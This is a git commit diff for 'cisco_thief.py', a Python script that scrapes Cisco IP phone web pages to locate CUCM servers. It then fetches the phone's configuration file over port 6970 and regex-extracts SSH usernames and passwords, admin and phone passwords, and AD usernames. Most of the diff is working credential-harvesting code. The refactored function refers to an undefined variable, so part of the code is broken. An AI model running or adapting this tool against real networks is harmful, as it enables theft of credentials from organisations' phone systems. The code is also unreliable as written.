364f0cbf6b01bff91400bf03003c3caa7f6a1d0a
varens <stan@leopolitan.net>
2022-12-21 16:28:40 +0900

    Fix loop; clean up.

--- cisco_thief.py
+++ cisco_thief.py
@@ -3,32 +3,22 @@ import requests
 import re
 from bs4 import BeautifulSoup as bs
 
-def get_cucm_name_from_phone(phone):
-    url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=phone)
-    try:
-        __http_response = requests.get(url, timeout=2)
-        if __http_response.status_code == 404:
-            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
-            __http_response = requests.get(url)
-        return parse_cucm(__http_response.text)
-    except Exception as e:
-        pass
-
 def parse_cucm(html):
-    cucm_hosts = []
+    hosts = []
     
     def cucm_hosts(tag):
         if tag.name != 'b': return False
         for prev in tag.parent.find_previous_siblings('td'):
-            if re.search(r'cucm server\d', str(prev.string), re.IGNORECASE):
+            if re.search(r'(?:cucm server|unified cm)\d', str(prev.string),
+                re.IGNORECASE):
                 return True
-    
+
     soup = bs(html, 'html.parser')
     for el in soup(cucm_hosts):
         if not el.string: continue
-        cucm_hosts.append(re.split(r'\s+', el.string)[0])
-        
-    return cucm_hosts
+        hosts.append(re.split(r'\s+', str(el.string))[0])
+
+    return hosts
 
 def get_config_names(CUCM_host,hostnames=None):
     config_names = []
@@ -55,72 +45,11 @@ def get_config_names(CUCM_host,hostnames=None):
     else:
         return config_names
 
-def get_hostname_from_phone(phone):
-    url = "http://{0}/CGI/Java/Serviceability?adapter=device.statistics.device".format(phone)
-    __http_response = requests.get(url)
-    if __http_response.status_code == 404:
-        if verbose:
-            print('Config file not found on HTTP Server: {0}'.format(phone))
-    else:
-        lines = __http_response.text
-    return parse_phone_hostname(lines,phone)
-
 def parse_phone_hostname(html, phoneip):
     html = html.replace('\n', '').replace('\r', '')
     hostname = re.search(r'(SEP[a-z0-9]{12})', html.strip(), re.IGNORECASE)
-    if hostname is None:
-        if verbose:
-            print(f'Could not find hostname for {phoneip}')
-        return None
-    else:
-        if hostname.group(1):
-            return hostname.group(1)
-
-def search_for_secrets(CUCM_host,filename):
-    global found_credentials
-    global found_usernames
-    lines = str()
-    user = str()
-    user2 = str()
-    password = str()
-    url = "http://{0}:6970/{1}".format(CUCM_host,
-                                        filename)
-    try:
-        __http_response = requests.get(url, timeout=10)
-        if __http_response.status_code == 404:
-            if verbose:
-                print('Config file not found on HTTP Server: {0}'.format(filename))
-        else:
-            lines = __http_response.text
-        for line in lines.split('\n'):
-            match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
-            if match:
-                if match.group(2):
-                    user = match.group(2)
-                    found_usernames.append((user,filename))
-                if match.group(3):
-                    password = match.group(3)
-                    found_credentials.append((user,password,filename))
-                if match.group(4):
-                    user2 = match.group(4)
-                    found_usernames.append((user2,filename))
-                if match.group(5):
-                    user2 = match.group(5)
-                    found_credentials.append(('unknown',password,filename))
-        if verbose:
-            if user and password:
-                print('{0}\t{1}\t{2}'.format(filename,user,password))
-            elif user:
-                print('SSH Username is {0} password was not set in {1}'.format(user,filename))
-            elif password:
-                print('SSH Username is not set, but password is {0} in {1}'.format(password,filename))
-            elif user2:
-                print('Possible AD username {0} found in config {1}'.format(user2,filename))
-            else:
-                if verbose:
-                    print('Username and password not set in {0}'.format(filename))
-    except Exception as e:
-        print("Could not connect to {CUCM_host}".format(CUCM_host=CUCM_host))
+    if hostname:
+        return hostname.group(1)
 
 def get_confpage(phoneip):
     url = f'http://{phoneip}/CGI/Java/Serviceability?' \
@@ -140,6 +69,61 @@ def scrape_phone(phoneip):
     return (parse_phone_hostname(phone_confpage, phoneip),
             parse_cucm(phone_confpage))
 
+def search_for_secrets(cucm_hosts, phone_hostname):
+    print('Got', cucm_hosts, phone_hostname)
+    global found_credentials
+    global found_usernames
+    lines = str()
+    user = str()
+    user2 = str()
+    password = str()
+    config_file = phone_hostname + '.cnf.xml'
+    creds_re = re.compile(r'(<sshUserId>(\S+)</sshUserId>|' \
+        + '<sshPassword>(\S+)</sshPassword>|' \
+        + '<userId.*>(\S+)</userId>|' \
+        + '<adminPassword>(\S+)</adminPassword>|' \
+        + '<phonePassword>(\S+)</phonePassword>)')
+    for cucm_host in cucm_hosts:
+        if not cucm_host: continue
+        url = f'http://{cucm_host}:6970/{config_file}'
+        try:
+            __http_response = requests.get(url, timeout=5)
+            if __http_response.status_code == 404:
+                if verbose:
+                    print(f'Config file not found at {url}')
+                continue
+            else:
+                lines = __http_response.text
+            
+            for line in lines.split('\n'):
+                if not (match := creds_re.search(line)): continue
+                if match.group(2):
+                    user = match.group(2)
+                    found_usernames.append((user,filename))
+                if match.group(3):
+                    password = match.group(3)
+                    found_credentials.append((user,password,filename))
+                if match.group(4):
+                    user2 = match.group(4)
+                    found_usernames.append((user2,filename))
+                if match.group(5):
+                    user2 = match.group(5)
+                    found_credentials.append(('unknown',password,filename))
+        except Exception as e:
+            print(f'Error during secret search at {url}: {e}')
+        else:
+            if not verbose: continue
+            if user and password:
+                print(f'{config_file}\t{user}\t{password}')
+            elif user:
+                print(f'SSH Username is {user} password was not set in {config_file}')
+            elif password:
+                print(f'SSH Username is not set, but password is {password} in {config_file}')
+            elif user2:
+                print(f'Possible AD username {user2} found in config {config_file}')
+            else:
+                print(f'Username and password not set in {config_file}')
+
 if __name__ == '__main__':
     global found_usernames
     global found_credentials
@@ -149,21 +133,11 @@ if __name__ == '__main__':
     parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
     parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')
     
-#    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
-#    parser.add_argument('--userenum', action='store_true', default=False, help='Enable user enumeration via UDS API')
-    
-#    parser.add_argument('-s','--subnet', type=str, help='IP Address of a Cisco Phone')
-    
-#    parser.add_argument('-e','--enumsubnet', type=str, help='IP Subnet to enumerate and pull credentials from in CIDR format x.x.x.x/24')
-
     args = parser.parse_args()
 
-#    CUCM_host = args.host
     phonelist = args.phonelist
     phone = args.phone
-#    subnet = args.subnet
     verbose = args.verbose
-#    enumsubnet = args.enumsubnet
     found_credentials = []
     found_usernames = []
     file_names = ''
@@ -186,26 +160,13 @@ if __name__ == '__main__':
         
     for phoneip in phoneips:
         (phone_hostname, cucm_hosts) = scrape_phone(phoneip)
-        
-#    get_version(CUCM_host)
-
-    CUCM_host = get_cucm_name_from_phone(phone) if CUCM_host is None else CUCM_host
-    if CUCM_host is None:
-        print('Unable to automatically detect the CUCM Server.')
-        quit(1)
-    else:
-        print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
-
-    file_names = get_config_names(CUCM_host)
-    if file_names is None:
-        hostnames = [get_hostname_from_phone(phone)]
-        file_names = get_config_names(CUCM_host, hostnames=hostnames)
-
-    if file_names is None:
-        print('Unable to detect file names from CUCM')
-    else:
-        for file in file_names:
-            search_for_secrets(CUCM_host,file)
+        if not cucm_hosts:
+            print(f'No CUCM hosts found in config for {phoneip}')
+            continue
+        if not phone_hostname:
+            print(f'No hostname found for {phoneip}')
+            continue
+        search_for_secrets(cucm_hosts, phone_hostname)
 
     if found_credentials != []:
         print('Credentials Found in Configurations!')
